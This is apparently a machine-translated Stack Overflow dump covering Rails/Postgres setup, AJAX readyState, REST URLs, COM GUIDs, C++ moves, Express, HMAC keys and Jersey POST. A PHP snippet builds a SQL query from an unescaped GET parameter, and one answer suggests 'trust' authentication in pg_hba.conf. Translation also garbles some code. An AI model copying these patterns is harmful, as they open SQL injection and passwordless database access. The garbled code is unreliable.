  railties (3.2.9) lib/rails/application.rb:223:in `call'
  rack (1.4.1) lib/rack/content_length.rb:14:in `call'
  railties (3.2.9) lib/rails/rack/log_tailer.rb:17:in `call'
  rack (1.4.1) lib/rack/handler/webrick.rb:59:in `service'
  /usr/local/rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/webrick/httpserver.rb:138:in `service'
  /usr/local/rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/webrick/httpserver.rb:94:in `run'
  /usr/local/rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/webrick/server.rb:191:in `block in start_thread'

  Rendered /usr/local/rvm/gems/ruby-1.9.3-p327/gems/actionpack-3.2.9/lib/action_dispatch/middleware/templates/rescues/_trace.erb (1.4ms)
  Rendered /usr/local/rvm/gems/ruby-1.9.3-p327/gems/actionpack-3.2.9/lib/action_dispatch/middleware/templates/rescues/_request_and_response.erb (0.9ms)
  Rendered /usr/local/rvm/gems/ruby-1.9.3-p327/gems/actionpack-3.2.9/lib/action_dispatch/middleware/templates/rescues/diagnostics.erb within rescues/layout (9.6ms)

This is my gemfile.lock

Gems included by the bundle:
  * actionmailer (3.2.9)
  * actionpack (3.2.9)
  * activemodel (3.2.9)
  * activerecord (3.2.9)
  * activeresource (3.2.9)
  * activesupport (3.2.9)
  * arel (3.0.2)
  * builder (3.0.4)
  * bundler (1.2.3)
  * coffee-rails (3.2.2)
  * coffee-script (2.2.0)
  * coffee-script-source (1.4.0)
  * erubis (2.7.0)
  * execjs (1.4.0)
  * hike (1.2.1)
  * i18n (0.6.1)
  * journey (1.0.4)
  * jquery-rails (2.1.4)
  * json (1.7.5)
  * mail (2.4.4)
  * mime-types (1.19)
  * multi_json (1.4.0)
  * pg (0.14.1)
  * polyglot (0.3.3)
  * rack (1.4.1)
  * rack-cache (1.2)
  * rack-ssl (1.3.2)
  * rack-test (0.6.2)
  * rails (3.2.9)
  * railties (3.2.9)
  * rake (10.0.2)
  * rdoc (3.12)
  * sass (3.2.3)
  * sass-rails (3.2.5)
  * sprockets (2.2.2)
  * thor (0.16.0)
  * tilt (1.3.3)
  * treetop (1.4.12)
  * tzinfo (0.3.35)
  * uglifier (1.3.0) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T18:45:34.460

检查位于应用程序目录根目录中的 Gemfile。

删除 gem 'sqlite' 并添加 gem 'pg' 然后保存。运行捆绑安装

安装 gems 的最佳方法是将它们添加到 gem 文件中并运行 bundle install。不推荐运行“gem install -”

您还需要修改位于 config 文件夹中的 database.yml 并进行必要的调整以运行 pg。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-08T08:02:23.270

如果您遇到此类错误，您必须检查三个文件..

1.database.yml 2\. postgresql 库中的 pg_hba.conf。3\. 如果你在远程机器上工作，我们还必须将我们的主机 ip 包含到 database.yml 文件中......

在创建项目时，使用他的命令向服务器了解您将使用 postgresql ..

'rails 新演示 --database=postgresql'

那么只有 pg gem 文件会被加载到 bundle..

将 pg_hba.conf 文件编辑为信任的 md5 文件。它将在您的 IP 地址附近。

md5- 需要密码才能连接到 db trust- 不要询问密码

确保您的 database.yml 文件正确

# javascript - ajax 在页面加载时被调用 4 次

> ID：13703785
> 
> 赞同：0
> 
> 时间：2012-12-04T13:12:49.270
> 
> 标签：javascript, ajax

首先，我沉迷于 jQuery，但我想创建一些无框架且尽可能轻量级的东西，所以我自己 ajaxing。

我有这个代码：

```
 function ajax(url)
{
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        console.log(xmlhttp.responseText);
    }
   else
        console.log( "error");
  }
xmlhttp.open("GET",url,true);
xmlhttp.send();
} 
```

我在脑海中调用一次：

```
ajax("url"); 
```

但是，我在控制台中看到 3 个“错误”日志，第 4 个是 rsponseText。

任何人都知道为什么会发生这种情况以及如何避免它？我的页面中**没有**其他脚本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:19:02.330

是的 onreadystatechange 调用每个州.... [http://www.w3schools.com/ajax/ajax_xmlhttprequest_onreadystatechange.asp上的更多信息](http://www.w3schools.com/ajax/ajax_xmlhttprequest_onreadystatechange.asp)

试试这个

```
if (xmlhttp.readyState==4) {
  if(xmlhttp.status==200) {
    console.log(xmlhttp.responseText);
  } 
  else {
     console.log('error');
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:18:28.907

```
xmlhttp.onreadystatechange=function() 
```

此回调用于超过 readystate 4 和 200。尝试将 xmlhttp.status 添加到您的错误消息中

```
function ajax(url)
{
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        console.log(xmlhttp.responseText);
    }
   else
        console.log( "error - readyState: "+xmlhttp.readyState);
  }
xmlhttp.open("GET",url,true);
xmlhttp.send();
} 
```

`ajax(url)`不是不止一次被调用，而是`xmlhttp.onreadystatechange`被调用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:19:49.807

这不是错误，也不是错误，您看到的是 onready statechange 事件并始终登录 else 块。httpObject 中不仅有成功和失败状态。

请[在这里查看](http://msdn.microsoft.com/en-gb/library/ie/ms534361%28v=vs.85%29.aspx)

如您所见，有 4 种状态，仅`xmlhttp.readyState==4 && xmlhttp.status==200`表示实际成功、请求完成且没有服务器错误。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:21:27.873

这是因为 readyState 将从 1 变为 4 int（即，在其他浏览器中较小）。

尝试：

```
xmlhttp.onreadystatechange=function(){
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    console.log(xmlhttp.responseText);
   else if(xmlhttp.readyState==4)
        console.log( "error");
} 
```

# url - 什么是在 RESTful url 中表示向量的好方法

> ID：13703789
> 
> 赞同：0
> 
> 时间：2012-12-04T13:13:12.377
> 
> 标签：url, rest

对于我正在构建的游戏，我想将代币放到板上的某个位置。板上的位置由 2D 向量表示，但现在我正在为在 url 中表示这些向量的小问题而摸不着头脑。

我能想到几个方案，没有一个是特别讨人喜欢的：

1.  `/point/{x}/{y}`前任。`/point/10/3`
2.  `/point/{y}/{x}`前任。`/point/3/10`
3.  `/point/({x},{y})`前任。`/point/(10,3)`

前两个的问题在于，向量的哪一部分先出现是相当随意的。第三个似乎有风险；我可以想象调试起来会很有趣，因为一些用户代理可能会编码 '(', ')' 或 ',' 字符，尽管我希望我的服务器端框架能够容忍这种情况。

你试过类似的东西吗？我错过了一个明显更好的选择吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:11:20.917

您给出的三个示例完全没有不安：

1.  `/point/{x}/{y}`前任。`/point/10/3`
2.  `/point/{y}/{x}`前任。`/point/3/10`
3.  `/point/({x},{y})`前任。`/point/(10,3)`

但是，我不会尝试用它自己的 URI 来表示板上的每个方格。客户是想单独获取任何方块，还是只获取整个棋盘？例如，如果这是 Checkers，则需要 64 次往返服务器才能获取每个棋盘格的状态。***非常***低效！对整个棋盘使用单个 URI 意味着每个方块的状态必须是一个属性：

```
PATCH /board
{ "x": "10", "y": "3", "token": "black", .. [other params] .. } 
```

或者

```
PATCH /board
{ "10,3": "black", .. [other params] .. } 
```

别忘了，`POST`如果你不能`PATCH`上板，你总是可以的。

您必须在 API 文档中定义哪个先出现（*x*或*y*）**。**请不要将*y*定义为第一个 :-)

# ios - 在 iOS 上设计菜单 UIViewController

> ID：13703790
> 
> 赞同：-2
> 
> 时间：2012-12-04T13:13:16.723
> 
> 标签：ios, user-interface, uinavigationcontroller

我想从导航控制器类引用中设计一个与此类似的视图控制器。我在下面添加了图片**它是由哪些元素组成的？**我是 iOS 新手，但不想坚持系统友好的方法

![在此处输入图像描述](../Images/98f1817902b16c2c5b84ed3b4afb6809.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:17:20.520

UITableView（控制器）（和故事板）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:18:53.090

它`UITableview`与风格`UITableViewStyleGrouped`

检查此链接
[http://www.iosdevnotes.com/2011/10/uitableview-tutorial/](http://www.iosdevnotes.com/2011/10/uitableview-tutorial/)
[http://www.mobisoftinfotech.com/blog/iphone/iphone-uitableview-tutorial-grouped-table/](http://www.mobisoftinfotech.com/blog/iphone/iphone-uitableview-tutorial-grouped-table/)

# jquery - jQuery Ajax 返回成功但返回的数据为假

> ID：13703791
> 
> 赞同：0
> 
> 时间：2012-12-04T13:13:15.740
> 
> 标签：jquery, joomla2.5

我们是 JQuery/Ajax 的新手，并从网络上的示例中获取了代码。我们有以下代码，它在访问一个表时工作正常，但是当我们将其更改为访问另一个表时，它返回成功，但返回的数据返回 false，即使访问的数据在那里。

这是被调用的程序

```
$host = "db";
$user = "xxxxxxxxx";
$pass = "xxxxxxxxx";
$databaseName = "xxxxxxxxx";
$tableName = "**ocl_drivers**";

$id = $_GET['id'];
$con = mysql_connect($host,$user,$pass);
$dbs = mysql_select_db($databaseName, $con);

$result = mysql_query("SELECT * FROM $tableName Where ID =".$id);      
$array = mysql_fetch_row($result);                                           
echo json_encode($array);
?> 
```

这是调用的 joomla 文章

```
 {source}

  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"         type="text/javascript"></script>

  <input type="text" id="userid" value="50">
  <input type="button" id="button" value="get user">
  <h2> Todays Job </h2>
  <div id="output"></div>

  <script id="source" language="javascript" type="text/javascript">

  $(document).ready(function() { 

    $("#button").click(function() { 

    $.ajax({ 

      url: '/reports/api1.php', //the script to call to get data 

      data: "id="+$('#userid').val(), 
      dataType: 'json', //data format 

      success: function(data) //on recieve of reply
      {
        var id = data[0]; //get id
        var vname = data[1]; //get name
        $('#output').html("<b>id: </b>"+id+"<b> name: </b>"+vname); //Set output element html
      }
    }); 
  }); 
}); 
</script> 
```

{/资源}

当我们访问用户表（ocl_users）时一切正常，但是当我们将其更改为访问驱动程序表时，即使数据确实退出，它也不会重新运行数据。

任何帮助将不胜感激。

谢谢理查德

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T22:16:37.247

我相信，如果数据在选项卡中，这是 jquery 的常见问题。

我有一个类似的问题，我在一个选项卡中加载数据，而在下一个选项卡中我正在加载谷歌地图。

它没有正确加载地图，因为它必须重新初始化。

你能给我看看页面吗？

# c++ - boost::interprocess_mutex 与进程本地 boost::mutex

> ID：13703794
> 
> 赞同：0
> 
> 时间：2012-12-04T13:13:32.960
> 
> 标签：c++, boost, synchronization, boost-interprocess

我正在开发一个到处使用`boost::interprocess_mutex`es 的项目，尽管该应用程序甚至从来没有`fork()`孩子，但严重依赖于多线程。

假设所有这些`interprocess_mutex`es 可以被进程本地互斥体替换而不破坏任何东西是否正确？

我认为这可能会提高性能（如果只是一个最小的因素）的假设是否正确？

在单个（可选多线程）进程中使用进程间同步是否有任何可以想象的理由？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:40:03.850

它是否使用共享内存或其他一些 IPC 机制？该内存是否被多个应用程序使用？那就是测试...

它不必分叉，可能有不同的代码库（单独的可执行文件）共享一些资源。例如，是否有一个监控应用程序或接口在通过某种 IPC 机制运行时从应用程序获取统计信息？请注意，可能还有其他更好的方法可以做到这一点，这只是一个示例。

看标题：

[http://www.boost.org/doc/libs/1_52_0/boost/interprocess/sync/windows/mutex.hpp](http://www.boost.org/doc/libs/1_52_0/boost/interprocess/sync/windows/mutex.hpp)

[http://www.boost.org/doc/libs/1_52_0/boost/interprocess/sync/posix/mutex.hpp](http://www.boost.org/doc/libs/1_52_0/boost/interprocess/sync/posix/mutex.hpp)

有开销，用本地版本（如果安全）替换它可以提高效率。但是，老实说，我对 Posix 的实现不太熟悉。

正如我上面所说，如果外部应用程序使用共享内存来获取统计信息或通信，您可能会使用 IPC - 但如果您不是这种情况，那么您可能可以替换它们。

# mysql - MySQL查询的Lambda表达式查询

> ID：13703796
> 
> 赞同：1
> 
> 时间：2012-12-04T13:13:34.973
> 
> 标签：mysql, c#-4.0, lambda

我正在尝试编写关于父子关系表的 MySQL 查询的 lambda 表达式，但我没有得到关于数据的正确输出，所以任何人都可以告诉我我们将如何编写它。

```
Parent_Type(Parent Table) :-  
CREATE  TABLE `Parent_Type` (
  `ID` INT NOT NULL AUTO_INCREMENT ,
  `NAME` VARCHAR(255) NULL ,
  `FLAG` decimal(1,0) DEFAULT NULL,
  PRIMARY KEY (`ID`) ); 
```

Child_Type（子表）：-

```
CREATE  TABLE `Child_Type` (
  `ID` INT NOT NULL AUTO_INCREMENT ,
  `NAME` VARCHAR(255) NULL ,
  `Parent_TYPE_ID` INT NULL,
  `FLAG` decimal(1,0) DEFAULT NULL,
  PRIMARY KEY (`ID`),INDEX `fk_Child_Type_1` (`PARENT_TYPE_ID` ASC),
  CONSTRAINT `fk_Child_Type_1`
    FOREIGN KEY (`PARENT_TYPE_ID` )
    REFERENCES `parent_type` (`ID` )
    ON DELETE NO ACTION
    ON UPDATE NO ACTION); 
```

虚拟数据：- ParentType-

```
ID名称标志

```

```
1 一个 0
 2 乙 0
 3 C 1

```

儿童类型：-

```
Id---------Name-----------------Parent_Type_Id--------Flag

```

```
 1 GA 1 0
 2 GB 1 1
 3 GC 2 1
 4 广东 2 0
 5 通用电气 3 0

```

MySQL查询：-

```
SELECT * from parent_type p left outer join child_type c
on p.ID = c.PARENT_TYPE_ID where p.flag=0 AND c.flag=0; 
```

所以，我需要两个表中都有 flag=0 的数据。输出数据：-

```
Id Parent_Type_Id 名称 ChildName 标志

```

```
1 1 GA 0
4 2 乙 GD 0

```

Upper Query 正在运行，并且输出正确。谁能告诉我这个查询将如何在 lambda 表达式中完成。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T12:52:58.980

试试这个 Linq，它可以帮助你

```
var linqQuery= from pa in parent_list where pa.Flag==0
               select ch in pa.child_type_list where ch.Flag==0
               select new 
               { 
                 id=ch.id, 
                 Parent_Type_Id=ch.Parent_Type_Id.ID,
                 Name=ch.Parent_Type_Id.Name,    
                 ChildName=ch.Name,
                 Flag=ch.Flag
                }; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-05T05:06:26.577

请分享你的 lamda 表达式.... 试试这个，也许这对你有帮助。

IList parentList=parent_type.Where(x=>x.FLAG==0 && (x=>x.child_type.where(t=>t.FLAG==0).Count>0)).ToList();

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-05T05:09:29.293

尝试这个 ....

var lambdaExpression = ParentType.Where(c => c.Flag == 0) .Join(ChildType.Where(uc => uc.Flag == 0), c => new { c.Name, c.ID }, uc => 新 { uc.Name, uc.ID }, (c, uc) => c);

如果仍然面临一些问题，请参阅此...

[将 SQL 子查询转换为 In 到 Linq Lambda](https://stackoverflow.com/questions/5528103/convert-sql-sub-query-to-in-to-linq-lambda)

[如何将表达式树转换为部分 SQL 查询？](https://stackoverflow.com/questions/7731905/how-to-convert-an-expression-tree-to-a-partial-sql-query)

# c# - 注册和更新 COM 对象，是否相同 GUID？

> ID：13703797
> 
> 赞同：0
> 
> 时间：2012-12-04T13:13:39.080
> 
> 标签：c#, com, guid

我正在使用 CodeDom 生成 COM 对象，这些对象在客户端机器上经常发布/注册（从 C# 用于 VBA）。

由于我正在生成这些对象，我发现每次更新/释放 COM 对象时为每个对象获取一个新的随机 GUID 比跟踪固定的 GUID 更容易。

这是潜在的问题根源吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:04:59.803

您*必须更改每个***更改**的 com-api-signature的 guid 。

@paul 是正确的，更改 guid 会破坏二进制兼容性。您必须重新编译每个静态链接到您的 com 的客户端（即 ac# 客户端）。

如果您从不更改现有的 com-api-signature 而是创建新的附加方法签名，则您无法最小化客户端重新编译。

这样旧程序仍然可以使用旧 api，而新程序可以从新 api 中受益。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:42:02.910

当接口或类的公共成员发生变化时，让其 [Guid] 发生变化是 COM 中的一项非常硬的要求。不这样做会调用一种非常讨厌的 DLL Hell，客户端将调用错误的方法或不存在的方法。极难诊断。更改 [Guid] 可确保客户端代码在调用无处之前得到错误。

在这种特殊情况下，更好的方法是**不**使用 [Guid] 属性，而是让 CLR 自动生成一个。它有一个非常好的算法，只要接口或类成员不改变，就可以保持 guid 稳定。

请注意，如果使用早期绑定，则更改 guid 还需要重新编译客户端代码。由于您没有提到这是始终如一的步骤，因此客户端代码可能使用后期绑定。在 VBA 中很容易做到，尽管您会失去一些舒适感，例如代码完成和编译错误而不是运行时错误。如果它使用后期绑定，那么 [Guid] 无关紧要。检查该代码，如果您看到`Dim`没有`As`或从未添加类型库，那么它正在使用后期绑定。

# javascript - 尝试将数组对象的属性发送到 innerHTML

> ID：13703798
> 
> 赞同：2
> 
> 时间：2012-12-04T13:13:41.857
> 
> 标签：javascript, arrays, innerhtml

我想发送一些文本字符串，这些文本字符串存储为数组中的对象值。

HTML：

```
<body onload="insertOption()";>
<p id='governmentOption'></p>
<p id='ngoOption'></p><br>
<p id='societyOption'></p> 
```

Javascript：

```
//an object with the strings I want to grab
var option1 = {
    optionGovernment: "text1",
    optionNGO: "text2",
    optionSociety: "text3"
}

//array of objects, each of which has three strings in them
var optionArray = [option1, option2, option3];

//the function that puts the object's strings into the HTML
function insertOption (){       
    document.getElementById('governmentOption').innerHTML = optionArray[0].optionGovernment;
    document.getElementById('ngoOption').innerHTML = option1.optionNGO;
    document.getElementById('societyOption').innerHTML = option1.optionSociety;
} 
```

如果我`option1.optionGovernment`在`insertOption`函数中使用，那么一切正常。

如果我尝试替换`option1`then`optionArray[0]`不仅不起作用`innerHTML`，另外两个（我保留为`option1`）也无法显示。

我对这个数组做错了什么？

（我宁愿不使用 jQuery 来完成这项任务，即使有一个优雅的解决方案——我正在尝试在接触 jQuery 之前掌握 Javascript（还没有！），这只是一个个人项目） .

# c++ - 从函数返回时避免复制 - 不依赖编译器优化

> ID：13703800
> 
> 赞同：0
> 
> 时间：2012-12-04T13:13:50.133
> 
> 标签：c++

*在此代码中，可以*在返回时复制一个巨大的向量（取决于编译器）：

```
vector<string> foo() {
  vector<string> vec;
  //make vec huge
  return vec;
}
vector<string> bar = foo(); 
```

如何在**不依赖编译器优化**的情况下避免复制向量？

现在，了解这只是一个简单的示例，只有一个 return 语句。但是对于更复杂的情况，即使是好的编译器也有可能无法进行优化以避免复制向量。（[这个](https://stackoverflow.com/a/10479595/1859852)对另一个问题的回答提到了一个这样的案例。）

（依赖编译器优化对我来说总是很奇怪，因为我应该编写**好的、可移植的 C++ 代码**，而不是担心这个和那个编译器是如何在幕后做事的。所有那些“编译器优化”对其他问题的回答因此让我感到困惑。）

到目前为止我想出的一个想法是使用 C++11 的智能指针：

```
shared_ptr<vector<string>> foo() {
  shared_ptr<vector<string>> vec_ptr = make_shared<vector<string>>();
  //make *vec_ptr (i.e. the actual vector) huge
  return vec_ptr;
}
shared_ptr<vector<string>> bar_ptr = foo();
//now, *bar_ptr is the underlying vector we can use 
```

看起来这将在所有情况下避免复制。问题是这段代码变得非常麻烦。

有什么好的不繁琐的替代品吗？据说，C++11 通过右值引用提供了一些新的“移动”功能。这些能帮上忙吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:42:30.077

> 据说，C++11 通过右值引用提供了一些新的“移动”功能。这些能帮上忙吗？

是的，如果编译器出于任何原因不使用 RVO，那么在这种情况下它将使用移动，因为 std::vector 具有移动运算符，并且在返回这样的单个变量时适用。当使用 c++11 编译器编译时，您的原始代码应该只执行此操作而无需任何更改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:28:37.403

一种老式的选择是**将向量作为对函数的引用传递，**并根据需要进行更改。

```
void foo(vector<string> &vec){
...

foo(bar); 
```

另一方面，据我所知，移动语义应该完全符合您的要求，它可能会在不更改您的代码的情况下发生，您可以通过调试器逐步检查它，让我进一步阅读。

编辑：[这个问题](https://stackoverflow.com/questions/9152798/c11-move-copy-construction-ambiguity)似乎表明您的原始代码应该自动作为移动操作工作。 [这个帖子](http://www.cprogramming.com/c++11/rvalue-references-and-move-semantics-in-c++11.html)似乎有更多的信息，但我有点太困了，无法掌握所有内容..

# javascript - Node.js 如何支持 Express.js？

> ID：13703801
> 
> 赞同：1
> 
> 时间：2012-12-04T13:13:58.493
> 
> 标签：javascript, node.js, express

我是 Node.js 和 Express.js 的新手；使用 Express.js 可执行文件 (express) 生成一个 express 应用程序，我在 app.js 中得到以下行：

```
...
var app = express();
http.createServer(app).listen(app.get('port'), function(){
    ...
});
... 
```

我想知道节点的 createServer 函数如何接受快速应用程序？Node.js 是否原生支持 Express.js？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-04T13:50:38.727

Node 的[`http.createServer`](http://nodejs.org/api/http.html#http_http_createserver_requestlistener)方法只要求传递给它的参数（`app`在这种情况下）可以作为函数调用，它将在`'request'`事件上调用。所以 Express 只需要满足与 node.js http 服务器集成的基本要求。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T13:22:00.197

`app`只是任何其他对象。Node 本身并不支持 Express。Express 只是在模拟`http.createServer()`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:23:29.797

基本上，`Node.js`本身并不支持 Express。Express 只是一个建立在`Node.js`

# c# - 使用扩展 gridview 的类作为控件

> ID：13703803
> 
> 赞同：1
> 
> 时间：2012-12-04T13:14:10.560
> 
> 标签：c#, asp.net

我制作了一个扩展 gridview 的类，以将使用时生成`autogeneratecolumns=true`的列添加到列集合中。

```
using System;
using System.Data;
using System.Collections;
using System.Web.UI.WebControls;

public class GridViewEx1 : GridView
{
private DataControlFieldCollection originalColumns;

public GridViewEx1()
    : base()
{
}
public void RecordColumns()
{
    originalColumns = new DataControlFieldCollection();
    foreach (DataControlField column in Columns)
        originalColumns.Add(column as DataControlField);
}

public void ResetColumns()
{
    if (originalColumns == null)
        RecordColumns();
    else
    {
        Columns.Clear();
        foreach (DataControlField column in originalColumns)
            Columns.Add(column as DataControlField);
    }
}

protected override ICollection CreateColumns(PagedDataSource dataSource, bool useDataSource)
{
    ResetColumns();
    ICollection generatedColumns = base.CreateColumns(dataSource, useDataSource);
    foreach (DataControlField column in generatedColumns)
        if (!originalColumns.Contains(column))
            Columns.Add(column as DataControlField);
    return Columns;
}
} 
```

但我不知道如何在 asp.net 页面中使用此控件？

我尝试使用我原来的 gridview 并像这样初始化它

```
gv1 = new GridViewEx1(); // gv1 is the id of my gridview 
```

但这只会使我的 gridview 完全为空。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:46:50.753

您需要在页面上注册您的控件。

```
<%@ Register TagPrefix="CustomControls" Namespace="MyProject.MyControlNamespace" Assembly="MyProject" %>

<CustomControls:GridViewEx1 runat="server" /> 
```

有关注册控件的更多信息：[http ://weblogs.asp.net/scottgu/archive/2006/11/26/tip-trick-how-to-register-user-controls-and-custom-controls-in-web-配置文件](http://weblogs.asp.net/scottgu/archive/2006/11/26/tip-trick-how-to-register-user-controls-and-custom-controls-in-web-config.aspx)

# c# - 在 C# 中为 HMAC SHA1 生成公钥和秘密

> ID：13703806
> 
> 赞同：3
> 
> 时间：2012-12-04T13:14:25.100
> 
> 标签：c#, asp.net, asp.net-mvc-3, hmacsha1

我想在 Asp.Net MVC 3 上为 REST API 服务实现类似 HMAC-SHA 签名算法的[AWS](http://docs.amazonwebservices.com/AmazonSimpleDB/latest/DeveloperGuide/HMACAuth.html)。是否有任何最佳实践来生成用户的公钥和秘密？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-13T16:32:14.443

我们已经建立了一个类似的系统。@James 引用的[问题提供了非常好的信息。](https://security.stackexchange.com/q/19809)请务必阅读。如果可能，仅通过 SSL/TLS 部署您的服务。

使用 HMAC-SHA 签名，您不需要公钥。服务器（服务）和客户端共享一个密钥，用于计算签名。根据上面提到的安全站点上的问题，确保每个客户端都有不同的密钥。

对于每个客户端，您还应该具有某种不同于您必须识别客户端的任何其他 ID 的服务客户端 ID。此服务客户端 ID 在请求标头中发送，因此您可以识别客户端。识别客户端后，您可以获得有关客户端的所需信息，包括客户端的服务密钥。

除了服务客户端 ID 之外，请求标头还应包含生成的实际签名。我还建议在标题中包含时间戳（更多内容见下文）。因此，您的请求将具有类似于以下的标头：

```
MySvc-Clientid: ServiceId
MySvc-Signature: Signature
MySvc-Timestamp: TimeStamp 
```

要使用 .NET/C# 生成客户端密钥，您可以创建一个生成 Rijndael 密钥的字符串表示形式的方法，该密钥可以传递给客户端。这是一个例子。

```
 public string CreateServiceClientKey()
    {
        SymmetricAlgorithm symAlg = SymmetricAlgorithm.Create("Rijndael");

        symAlg.KeySize = 128;

        byte[] key = symAlg.Key;

        StringBuilder sb = new StringBuilder(key.Length * 2);

        foreach (byte b in key)
        {
            sb.AppendFormat("{0:x2}", b);
        }

        return sb.ToString();
    } 
```

在我们的系统中，当启用新的服务客户端时，会生成服务客户端 id 和服务密钥并将其存储在客户端的数据库中。服务客户端 ID 可能只是一个 GUID。

客户端的服务密钥是您和客户端之间的共享密钥。仅通过安全机制将其交付给客户端，例如在 SSL/TLS 上运行的网站的经过身份验证的部分。否则，您将向其他人敞开心扉，让他人获得密钥。

时间戳应由客户端生成，并包含在生成签名的签名字符串中。这为签名增加了时间特定的可变性。AWS 也这样做。

关于要签名的字符串，在您这边，我还建议您定义一个接口，以便在与请求签名进行比较时构建您要签名的字符串。这将允许您为不同的服务甚至不同的操作构建不同的实现。这对我们的实施非常有用。这是一个例子：

```
public interface IStringToSignBuilder
{
    string Build(ServiceSignatureDetails details);
}

/// <summary>
/// Class is a data entity that defines the specific details
/// required for a Service Signature
/// </summary>
public class ServiceSignatureDetails
{
    public string HttpMethod { get; set; }
    public string ServiceClientId { get; set; }
    public string ServiceClientKey { get; set; }
    public string UriAbsolutePath { get; set; }
    public string DomainName { get; set; }
    public string CompanyName { get; set; }
    public string DateTimeStamp { get; set; }
    public string Data { get; set; }
} 
```

然后，您可以构建`IStringToSignBuilder`满足您需求的特定实现，并相应地将正确的实现注入您的代码中。

# java - RESTful Web 服务中的@POST

> ID：13703807
> 
> 赞同：31
> 
> 时间：2012-12-04T13:14:24.980
> 
> 标签：java, rest, jersey

我一直在尝试使用 Jersey 来理解 RESTful Web 服务中的 @POST。我同样浏览了[http://www.vogella.com/articles/REST/article.html](http://www.vogella.com/articles/REST/article.html)并且能够获得有关 @POST 的一些信息，但感到困惑和笨拙。任何人都可以用一个简单的例子来解释@POST 或者分享相同的链接。

通过上面链接中的 TODO 对象实现 @POST 很好，但我希望通过其他一些简单的示例来学习 @POST，以便我可以继续开发自己的复杂 @POST 示例。

帮助将是可观的，谢谢。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-12-11T08:59:33.120

请在下面找到示例，它可能会对您有所帮助

```
package jersey.rest.test;

import javax.ws.rs.DELETE;
import javax.ws.rs.GET;
import javax.ws.rs.HEAD;
import javax.ws.rs.POST;
import javax.ws.rs.PUT;
import javax.ws.rs.Path;
import javax.ws.rs.PathParam;
import javax.ws.rs.core.Response;

@Path("/hello")
public class SimpleService {
    @GET
    @Path("/{param}")
    public Response getMsg(@PathParam("param") String msg) {
        String output = "Get:Jersey say : " + msg;
        return Response.status(200).entity(output).build();
    }

    @POST
    @Path("/{param}")
    public Response postMsg(@PathParam("param") String msg) {
        String output = "POST:Jersey say : " + msg;
        return Response.status(200).entity(output).build();
    }

    @POST
    @Path("/post")
    //@Consumes(MediaType.TEXT_XML)
    public Response postStrMsg( String msg) {
        String output = "POST:Jersey say : " + msg;
        return Response.status(200).entity(output).build();
    }

    @PUT
    @Path("/{param}")
    public Response putMsg(@PathParam("param") String msg) {
        String output = "PUT: Jersey say : " + msg;
        return Response.status(200).entity(output).build();
    }

    @DELETE
    @Path("/{param}")
    public Response deleteMsg(@PathParam("param") String msg) {
        String output = "DELETE:Jersey say : " + msg;
        return Response.status(200).entity(output).build();
    }

    @HEAD
    @Path("/{param}")
    public Response headMsg(@PathParam("param") String msg) {
        String output = "HEAD:Jersey say : " + msg;
        return Response.status(200).entity(output).build();
    }
} 
```

对于测试，您可以使用任何工具，例如 RestClient (http://code.google.com/p/rest-client/)

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-12-04T17:34:30.027

REST 网络服务：（http://localhost:8080/your-app/rest/data/post）

```
package com.yourorg.rest;

import javax.ws.rs.Consumes;
import javax.ws.rs.POST; 
import javax.ws.rs.Path; 
import javax.ws.rs.Produces; 
import javax.ws.rs.core.MediaType; 
import javax.ws.rs.core.Response;

    @Path("/data")
public class JSONService {

    @POST
    @Path("/post")
    @Consumes(MediaType.APPLICATION_JSON)
    public Response createDataInJSON(String data) { 

        String result = "Data post: "+data;

        return Response.status(201).entity(result).build(); 
    } 
```

客户发帖：

```
package com.yourorg.client;

import com.sun.jersey.api.client.Client;
import com.sun.jersey.api.client.ClientResponse;
import com.sun.jersey.api.client.WebResource;

public class JerseyClientPost {

  public static void main(String[] args) {

    try {

        Client client = Client.create();

        WebResource webResource = client.resource("http://localhost:8080/your-app/rest/data/post");

        String input = "{\"message\":\"Hello\"}";

